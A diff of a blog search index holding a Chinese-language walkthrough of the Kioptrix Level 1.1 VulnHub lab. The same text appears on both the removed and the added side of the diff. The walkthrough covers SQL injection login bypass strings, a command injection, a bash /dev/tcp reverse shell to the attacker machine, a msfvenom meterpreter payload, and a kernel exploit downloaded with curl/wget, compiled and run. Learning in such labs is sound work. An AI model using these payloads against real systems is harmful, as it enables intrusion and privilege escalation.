@@ -1,315 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Kioptrix Level 1.1(#2)</title>
-    <url>/2024/02/03/Kioptrix_Level_1.1/</url>
-    <content><![CDATA[<h1 id="kioptrix-level-112"><a class="markdownIt-Anchor" href="#kioptrix-level-112"></a> Kioptrix Level 1.1(#2)</h1>
-<blockquote>
-<p>参考 <a href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)</a></p>
-</blockquote>
-<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
-<h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3>
-<ul>
-<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
-<li>nmap扫描端口及端口服务</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure>
-<p><strong>看到了web服务：80端口和443端口</strong></p>
-<ul>
-<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>F12 查看源代码</li>
-</ul>
-<img src="/2024/02/03/Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
-<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
-<h4 id="我的体验"><a class="markdownIt-Anchor" href="#我的体验"></a> 我的体验</h4>
-<p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
-<h3 id="web渗透"><a class="markdownIt-Anchor" href="#web渗透"></a> web渗透</h3>
-<h4 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> Sql注入</h4>
-<ul>
-<li>
-<p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>' or '1' = '1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
-</li>
-<li>
-<p>还有一篇walkthrough里面有人是username输入<code>admin' or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
-<ul>
-<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
-</ul>
-</li>
-<li>
-<p>成功后看到以下页面：</p>
-</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h4 id="寻找漏洞rce漏洞"><a class="markdownIt-Anchor" href="#寻找漏洞rce漏洞"></a> 寻找漏洞：RCE漏洞</h4>
-<ul>
-<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
-<p><strong>证明确实存在RCE</strong></p>
-<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4>
-<h5 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h5>
-<blockquote>
-<p>参考 <a href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com)</a></p>
-</blockquote>
-<h6 id="0x01-bash建立tcp连接"><a class="markdownIt-Anchor" href="#0x01-bash建立tcp连接"></a> 0x01 bash建立tcp连接</h6>
-<ul>
-<li>
-<p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
-</li>
-<li>
-<p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
-</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
-<h6 id="0x02-msfvenom生成后门"><a class="markdownIt-Anchor" href="#0x02-msfvenom生成后门"></a> 0x02 msfvenom生成后门</h6>
-<blockquote>
-<p>参考<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<ul>
-<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure>
-<h3 id="linux-提权-linux-privilege-escalation"><a class="markdownIt-Anchor" href="#linux-提权-linux-privilege-escalation"></a> Linux 提权  Linux Privilege Escalation</h3>
-<blockquote>
-<p>参考 <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权</a></p>
-</blockquote>
-<h4 id="提权信息收集"><a class="markdownIt-Anchor" href="#提权信息收集"></a> 提权信息收集</h4>
-<ul>
-<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure>
-<p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>发现Linux版本是CentOS 4.5</strong></p>
-<ul>
-<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
-</ul>
-<blockquote>
-<p>关于工具使用：<a href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客</a></p>
-</blockquote>
-<h4 id="寻找centos-45漏洞利用提权脚本"><a class="markdownIt-Anchor" href="#寻找centos-45漏洞利用提权脚本"></a> 寻找CentOS 4.5漏洞利用提权脚本</h4>
-<ul>
-<li><code>searchsploit CentOS 4.5</code></li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
-</ul>
-<h4 id="将脚本传到靶机"><a class="markdownIt-Anchor" href="#将脚本传到靶机"></a> 将脚本传到靶机</h4>
-<h5 id="0x01-python-simplehttpserver-快速共享当前目录"><a class="markdownIt-Anchor" href="#0x01-python-simplehttpserver-快速共享当前目录"></a> 0x01 Python SimpleHTTPServer 快速共享当前目录</h5>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><mark><em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em></mark></p>
-<ul>
-<li>同时在攻击机上也可以看到靶机的信息</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h5 id="0x02-service-apache2-start"><a class="markdownIt-Anchor" href="#0x02-service-apache2-start"></a> 0x02 service apache2 start</h5>
-<ul>
-<li>
-<p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
-</li>
-<li>
-<p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
-</li>
-<li>
-<p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
-</li>
-<li>
-<p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
-</li>
-</ul>
-<h4 id="编译运行脚本"><a class="markdownIt-Anchor" href="#编译运行脚本"></a> 编译运行脚本</h4>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2>
-<blockquote>
-<p>优秀总结：<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<h3 id="关于631端口-ipp服务-cups-11"><a class="markdownIt-Anchor" href="#关于631端口-ipp服务-cups-11"></a> 关于631端口 ipp服务 CUPS 1.1</h3>
-<ul>
-<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
-</ul>
-<h3 id="关于渗透方向"><a class="markdownIt-Anchor" href="#关于渗透方向"></a> 关于渗透方向</h3>
-<ul>
-<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
-</ul>
-<h3 id="关于-linux-提权"><a class="markdownIt-Anchor" href="#关于-linux-提权"></a> 关于 Linux 提权</h3>
-<ul>
-<li>
-<p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
-</li>
-<li>
-<p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
-<ul>
-<li>LinEnum 可以枚举信息</li>
-<li><a href="http://lse.sh">lse.sh</a> 可以枚举一些系统可能存在的漏洞信息</li>
-</ul>
-<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
-</li>
-<li>
-<p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
-</li>
-</ul>
-<h3 id="关于主机间传文件-via-http"><a class="markdownIt-Anchor" href="#关于主机间传文件-via-http"></a> 关于主机间传文件 via http</h3>
-<ul>
-<li>Python建立简单http服务</li>
-<li>在攻击机中开启apache</li>
-</ul>
-<h3 id="关于web渗透sql注入"><a class="markdownIt-Anchor" href="#关于web渗透sql注入"></a> 关于web渗透sql注入</h3>
-<ul>
-<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
-</ul>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Kioptrix Level 1.1(#2)</title>
+      <link href="/2024/02/03/Kioptrix_Level_1.1/"/>
+      <url>/2024/02/03/Kioptrix_Level_1.1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="kioptrix-level-112"><a class="markdownIt-Anchor" href="#kioptrix-level-112"></a> Kioptrix Level 1.1(#2)</h1><blockquote><p>参考 <a href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)</a></p></blockquote><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3><ul><li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li><li>nmap扫描端口及端口服务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure><p><strong>看到了web服务：80端口和443端口</strong></p><ul><li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>F12 查看源代码</li></ul><img src="/2024/02/03/Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p><h4 id="我的体验"><a class="markdownIt-Anchor" href="#我的体验"></a> 我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p><h3 id="web渗透"><a class="markdownIt-Anchor" href="#web渗透"></a> web渗透</h3><h4 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> Sql注入</h4><ul><li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>' or '1' = '1 </code>（这里的sql注入很简单，很多思路都是可以的）</p></li><li><p>还有一篇walkthrough里面有人是username输入<code>admin' or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p><ul><li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li></ul></li><li><p>成功后看到以下页面：</p></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h4 id="寻找漏洞rce漏洞"><a class="markdownIt-Anchor" href="#寻找漏洞rce漏洞"></a> 寻找漏洞：RCE漏洞</h4><ul><li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p><p><strong>证明确实存在RCE</strong></p><h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4><h5 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h5><blockquote><p>参考 <a href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com)</a></p></blockquote><h6 id="0x01-bash建立tcp连接"><a class="markdownIt-Anchor" href="#0x01-bash建立tcp连接"></a> 0x01 bash建立tcp连接</h6><ul><li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p></li><li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p><h6 id="0x02-msfvenom生成后门"><a class="markdownIt-Anchor" href="#0x02-msfvenom生成后门"></a> 0x02 msfvenom生成后门</h6><blockquote><p>参考<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p></blockquote><ul><li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure><h3 id="linux-提权-linux-privilege-escalation"><a class="markdownIt-Anchor" href="#linux-提权-linux-privilege-escalation"></a> Linux 提权  Linux Privilege Escalation</h3><blockquote><p>参考 <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权</a></p></blockquote><h4 id="提权信息收集"><a class="markdownIt-Anchor" href="#提权信息收集"></a> 提权信息收集</h4><ul><li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure><p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>发现Linux版本是CentOS 4.5</strong></p><ul><li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li></ul><blockquote><p>关于工具使用：<a href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客</a></p></blockquote><h4 id="寻找centos-45漏洞利用提权脚本"><a class="markdownIt-Anchor" href="#寻找centos-45漏洞利用提权脚本"></a> 寻找CentOS 4.5漏洞利用提权脚本</h4><ul><li><code>searchsploit CentOS 4.5</code></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li></ul><h4 id="将脚本传到靶机"><a class="markdownIt-Anchor" href="#将脚本传到靶机"></a> 将脚本传到靶机</h4><h5 id="0x01-python-simplehttpserver-快速共享当前目录"><a class="markdownIt-Anchor" href="#0x01-python-simplehttpserver-快速共享当前目录"></a> 0x01 Python SimpleHTTPServer 快速共享当前目录</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure><ul><li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><mark><em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em></mark></p><ul><li>同时在攻击机上也可以看到靶机的信息</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h5 id="0x02-service-apache2-start"><a class="markdownIt-Anchor" href="#0x02-service-apache2-start"></a> 0x02 service apache2 start</h5><ul><li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p></li><li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p></li><li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p></li><li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p></li></ul><h4 id="编译运行脚本"><a class="markdownIt-Anchor" href="#编译运行脚本"></a> 编译运行脚本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2><blockquote><p>优秀总结：<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p></blockquote><h3 id="关于631端口-ipp服务-cups-11"><a class="markdownIt-Anchor" href="#关于631端口-ipp服务-cups-11"></a> 关于631端口 ipp服务 CUPS 1.1</h3><ul><li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li></ul><h3 id="关于渗透方向"><a class="markdownIt-Anchor" href="#关于渗透方向"></a> 关于渗透方向</h3><ul><li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li></ul><h3 id="关于-linux-提权"><a class="markdownIt-Anchor" href="#关于-linux-提权"></a> 关于 Linux 提权</h3><ul><li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p></li><li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p><ul><li>LinEnum 可以枚举信息</li><li><a href="http://lse.sh">lse.sh</a> 可以枚举一些系统可能存在的漏洞信息</li></ul><p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p></li><li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p></li></ul><h3 id="关于主机间传文件-via-http"><a class="markdownIt-Anchor" href="#关于主机间传文件-via-http"></a> 关于主机间传文件 via http</h3><ul><li>Python建立简单http服务</li><li>在攻击机中开启apache</li></ul><h3 id="关于web渗透sql注入"><a class="markdownIt-Anchor" href="#关于web渗透sql注入"></a> 关于web渗透sql注入</h3><ul><li>sql注入知识（<strong>有待进一步学习</strong>）</li></ul>]]></content>
+      
+      
       <categories>
-        <category>类OSCP靶机练习</category>
+          
+          <category> 类OSCP靶机练习 </category>
+          
       </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
